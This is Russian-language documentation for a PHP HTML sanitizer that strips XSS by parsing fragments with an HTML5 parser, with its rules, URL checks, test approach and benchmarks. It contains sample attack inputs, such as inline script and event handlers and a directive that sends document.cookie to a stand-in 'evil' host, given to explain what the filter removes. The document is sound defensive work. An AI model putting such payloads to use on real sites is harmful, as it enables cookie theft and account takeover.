# Введение

`Expansa\Security\Markup` — фильтр HTML от XSS: оставляет только разрешённые элементы, атрибуты и
протоколы ссылок, всё остальное удаляет. Фрагмент разбирается HTML5-парсером PHP (`Dom\HTMLDocument`)
по спецификации, как его разберёт браузер, дерево фильтруется по правилам и собирается обратно. Поэтому
браузер разберёт результат так же, как фильтр, — это закрывает mutation XSS, на котором ломаются
фильтры на регулярных выражениях.

Обычно фильтр вызывается через `Sanitizer::markup()` (фасад `Safe`):

```php
use Expansa\Facades\Safe;

Safe::markup('<p onclick="steal()">Привет, <b>мир</b><script>alert(1)</script></p>');
// <p>Привет, <b>мир</b></p>
```

Фильтр — для HTML, который **должен** остаться разметкой: текст записи, описание, подпись. Для
обычного текста используйте `Safe::html()`, он экранирует всё.

| Класс       | Назначение                                                        |
|-------------|-------------------------------------------------------------------|
| `Markup`    | Фильтр: правила по умолчанию `RULES`, протоколы `PROTOCOLS`       |
| `Sanitizer` | `markup()` — фильтр с правилами по умолчанию и дополнительными    |

Требуется расширение `dom` (PHP 8.4, `Dom\HTMLDocument`).

## Спецификация

Этот раздел — описание поведения, по которому написан класс и тесты `tests/Markup.php`.

### Разбор

1. Строка без `<`, `>`, `&`, `\r` и NUL возвращается как есть: в ней нет разметки и сущностей.
2. Невалидный UTF-8 — пустая строка.
3. Остальное разбирается алгоритмом разбора фрагмента HTML5 в контексте `<body>`: так браузер разбирает
   разметку, вставленную в страницу. Парсер сам закрывает незакрытые элементы, исправляет вложенность,
   декодирует сущности, приводит имена элементов и атрибутов к нижнему регистру, удаляет NUL из текста
   и повторяющиеся атрибуты.
4. Результат — сериализация дерева по спецификации HTML5.

### Узлы

| Узел                                   | Результат                                                    |
|----------------------------------------|--------------------------------------------------------------|
| Текст                                  | Остаётся; `&`, `<`, `>`, неразрывный пробел — сущностями      |
| Разрешённый элемент                    | Остаётся с разрешёнными атрибутами, содержимое фильтруется    |
| Неразрешённый элемент с кодом, сырым текстом или чужим содержимым: `script`, `style`, `template`, `iframe`, `object`, `embed`, `noscript`, `textarea`, `title`, `head`, `meta`, `link`, `base` и другие | Удаляется вместе с содержимым |
| SVG и MathML, если не разрешены явно    | Удаляются вместе с содержимым                                |
| Другой неразрешённый элемент: `font`, `center`, `form`, свой `x-card` | Заменяется своим отфильтрованным содержимым |
| Комментарий, `<!DOCTYPE>`, `<?...?>`, `<![CDATA[...]]>` | Удаляется                                  |
| `iframe`, если разрешён                 | Без содержимого: браузер его не показывает                    |

`script`, `style`, `template`, `noscript`, `noembed`, `noframes`, `xmp`, `plaintext`, `base`, `meta`,
`link` нельзя разрешить: правила с ними не создаются (`InvalidArgumentException`).

### Атрибуты

Атрибут остаётся, если он разрешён для элемента или для всех элементов (`*`) и его значение
проходит проверку правила.

- `on*`, `style`, `srcdoc`, `formaction` удаляются всегда, правила с ними не создаются;
- маска `data-*` разрешает `data-id`, но не пустое `data-` и не `on*`; одиночная `*` запрещена —
  она разрешила бы любой атрибут;
- атрибут без значения выводится с пустым значением: `<a download>` → `<a download="">`.

### Ссылки

Значения `href`, `src`, `srcset`, `poster`, `cite`, `action`, `data`, `background`, `longdesc`,
`xlink:href` и других URL-атрибутов проверяются всегда, как бы ни было записано правило; проверку
`url` можно назначить и своему атрибуту.

1. Сущности уже декодированы парсером: `&#x6A;`, `&colon;`, `&#0058;` — это обычные символы.
2. Как в URL-парсере браузера, удаляются пробелы и управляющие символы по краям и табуляции и переводы
   строк внутри: `java&#x09;script:` — это `javascript:`.
3. Если до первого `/`, `?` или `#` есть `:`, текст до него — протокол. Протокол вне списка — атрибут
   удаляется целиком. Адрес без протокола (`/page`, `#top`, `?a=1`, `page.html`) остаётся.
4. В `srcset` проверяется адрес каждого варианта, достаточно одного запрещённого.

Разрешены `ftp`, `http`, `https`, `irc`, `mailto`, `sftp`, `sms`, `tel`, `webcal`. `data:` и
`javascript:` не разрешены нигде.

### Что изменилось по сравнению с `Kses`

- содержимое `script`, `style` и других элементов с кодом удаляется, а не остаётся текстом;
- элемент с запрещённым протоколом теряет атрибут целиком, а не только протокол; остальные атрибуты
  на протокол не проверяются: `<a title="Note: hi">` больше не теряет `Note:`;
- результат — сериализация HTML5: незакрытые элементы закрыты, имена в нижнем регистре, значения
  в двойных кавычках, `<br />` → `<br>`, именованные сущности кроме `&amp;`, `&lt;`, `&gt;`, `&nbsp;`,
  `&quot;` — символами;
- элементы таблицы вне `<table>` удаляются парсером, как в браузере;
- формат правил: проверки `text`, `url`, `number` и список значений вместо `maxlen`, `valueless` и других.

## Правила по умолчанию

Разрешённые элементы и атрибуты — в `Markup::RULES` (по алфавиту), протоколы — в `Markup::PROTOCOLS`.

**Атрибуты любого элемента** (`*`): `class`, `title`, `lang`, `dir`, `role`, `aria-*`, `data-*`.

**Элементы**:

- текст: `p`, `span`, `b`, `strong`, `i`, `em`, `u`, `s`, `small`, `mark`, `sub`, `sup`, `code`, `pre`,
  `kbd`, `samp`, `var`, `blockquote`, `q`, `abbr`, `cite`, `dfn`, `bdi`, `bdo`, `del`, `ins`,
  `time` (`datetime`), `data` (`value`), `ruby`, `rt`, `rp`, `h1`–`h6`, `hgroup`, `br`, `hr`, `wbr`;
- разделы: `article`, `aside`, `header`, `footer`, `main`, `nav`, `section`, `address`, `div`,
  `details` (`open`, `name`), `summary`, `figure`, `figcaption`;
- ссылки и медиа: `a` (`href`, `target`, `rel`, `download`, `hreflang`, `type`), `img` (`src`, `srcset`,
  `sizes`, `alt`, `width`, `height`, `loading`, `decoding`), `picture`, `source`, `audio`, `video`
  (`poster`, `playsinline`…), `track`, `iframe` (`src`, `allow`, `allowfullscreen`, `loading`,
  `referrerpolicy`, `sandbox`, `width`, `height`);
- списки и таблицы: `ul`, `ol` (`start`, `reversed`, `type`), `li` (`value`), `dl`, `dt`, `dd`,
  `table`, `caption`, `colgroup`, `col` (`span`), `thead`, `tbody`, `tfoot`, `tr`, `th`, `td`
  (`colspan`, `rowspan`, `headers`, `scope`);
- формы для отображения: `button` (только `type="button"`), `select`, `option`, `optgroup`, `label`,
  `fieldset`, `legend`, `meter`, `progress`.

`id` и `name` не разрешены: ими страница пользователя могла бы перекрыть глобальные переменные и
элементы дашборда (DOM clobbering). `iframe` разрешён с любым `src` на разрешённом протоколе — если
встраивать можно только доверенные сайты, уберите его из своих правил.

### Директивы youla

Значения директив youla (`u-select`, `u-text`, `u-bind`…) исполняются как JavaScript, а весь
дашборд — компонент youla (`<body u-data="youla">`). Если бы фильтр пропускал директивы, текст
пользователя вроде `<select u-select="fetch('//evil/?'+document.cookie)">` выполнился бы у
администратора. Поэтому директив нет в правилах по умолчанию, их добавляют только для доверенной
разметки, правилами одного вызова:

```php
Safe::markup($html, ['select' => ['u-select']]);
```

### Директивы Vue и других фреймворков

Имя атрибута может содержать `:`, `@` и `.`: `v-on:click.prevent`, `:href`, `@click`. По умолчанию они
не разрешены; для доверенной разметки их разрешают масками:

```php
Safe::markup($template, ['*' => ['v-*', ':*', '@*']]);
```

Директивы Vue — тоже JavaScript. Кроме того, Vue выполняет интерполяцию `{{ }}` в обычном тексте, а для
фильтра это просто текст. Поэтому пользовательский HTML выводите вне области, на которой смонтирован
Vue, или внутри `<div v-pre>`.

## Правила

Ключ — имя элемента в нижнем регистре или `*` для атрибутов всех элементов, значение — атрибуты
элемента и их проверки. Пустой массив разрешает элемент без своих атрибутов.

```php
use Expansa\Security\Markup;

$markup = new Markup(
    rules: [
        '*'    => ['class', 'data-*' => 'text'],
        'a'    => ['href' => 'url', 'target' => ['_blank', '_self']],
        'td'   => ['colspan' => 'number'],
        'b'    => [],
    ],
    protocols: ['https', 'mailto'],
);

$markup->sanitize($html);
```

| Проверка         | Атрибут остаётся, если                                                  |
|------------------|-------------------------------------------------------------------------|
| `'text'`         | всегда; так же читается атрибут в списке без ключа: `['class']`          |
| `'url'`          | адрес без протокола или с разрешённым протоколом, см. «Ссылки»          |
| `'number'`       | целое или десятичное число: `3`, `-1`, `0.5`                            |
| список значений  | значение есть в списке, без учёта регистра: `['_blank', '_self']`       |

Свои атрибуты элемента перекрывают атрибуты `*` с тем же именем. Неизвестная проверка, запрещённый
элемент или атрибут выбрасывают `InvalidArgumentException` при создании фильтра. Правила не меняются
после создания (`readonly`), поэтому один экземпляр можно переиспользовать — `Sanitizer::markup()`
так и делает.

### SVG и MathML

Разрешаются только явно, всеми элементами, которые нужны, — правила те же: `['svg' => ['viewbox' => 'text'],
'path' => ['d' => 'text']]`. Чужое содержимое — главный источник mutation XSS, поэтому разрешайте их
только для доверенной разметки.

## Расширение

**Для вызова** — второй аргумент `Safe::markup()`: атрибуты добавляются к атрибутам элемента, новые
элементы — к правилам.

```php
Safe::markup($html, ['select' => ['u-select']]);
```

**Для своего фильтра** — `Markup::extend()`, возвращает правила по умолчанию или переданные вторым
аргументом с добавленными:

```php
$markup = new Markup(Markup::extend(['x-card' => ['id' => 'text']]));
```

`Safe::markup()` держит отдельный фильтр для каждого набора дополнительных правил.

## Проверка на векторах атак

`tests/Markup.php` прогоняет через фильтр векторы из
[OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html),
PortSwigger и известные mutation XSS (`tests/fixtures/xss-vectors.txt`, по одному на строку).
Результат разбирается `Dom\HTMLDocument` в `body` и внутри строки таблицы. Выход опасен, если в нём есть
элемент вне правил или SVG/MathML, атрибут `on*`, `style`, `srcdoc`, `formaction` или URL-атрибут
с протоколом вне списка. Кроме того, результат фильтра должен быть неподвижной точкой: повторная
фильтрация его не меняет.

Проверка не заменяет политику: `iframe` с разрешённым протоколом встраивает любой сайт. Если это
важно, сузьте правила.

## Производительность

`php tests/benchmarks/Markup.php [--baseline=<git ref>]` сравнивает с `Markup` или `Kses` из коммита
(по умолчанию `HEAD`) на тех же данных; последний коммит с `Kses` — `312b293`.

| Вход                 | `Kses`, мкс | `Markup`, мкс |
|----------------------|------------:|--------------:|
| текст без разметки   |         0.3 |           0.3 |
| текст с сущностями   |         1.9 |           6.3 |
| короткий заголовок   |         0.7 |       3.3–4.5 |
| статья 5 КБ          |          31 |            99 |
| статья 100 КБ        |         603 |          2030 |
| набор XSS-атак       |          28 |           123 |

Фильтр в 2–3.5 раза медленнее `Kses`: из ~99 мкс на статью 5 КБ ~55 мкс — разбор (`lexbor` и перенос
дерева в `libxml2` внутри PHP) и ~11 мкс — сериализация, это C-код, его не ускорить. Это цена разбора
«как в браузере», которая закрывает mutation XSS. `Sanitizer::markup()` вызывается при сохранении записи,
не при выводе, поэтому на время ответа страницы фильтр не влияет.

Приёмы:

- текст без `<`, `>`, `&`, `\r` и NUL возвращается сразу, после проверки UTF-8;
- текст без `<` только разбирается и сериализуется, без обхода;
- поиск комментариев (XPath) — только если в тексте есть `<!`, `<?` или `</` не перед буквой, проверка
  пространства имён — только если есть `<svg` или `<math`;
- правила компилируются в конструкторе: атрибуты элемента и `*` — две таблицы поиска, маски — отдельно;
- адрес, который начинается с разрешённого протокола или в котором `/` раньше `:`, не проходит полную
  проверку.
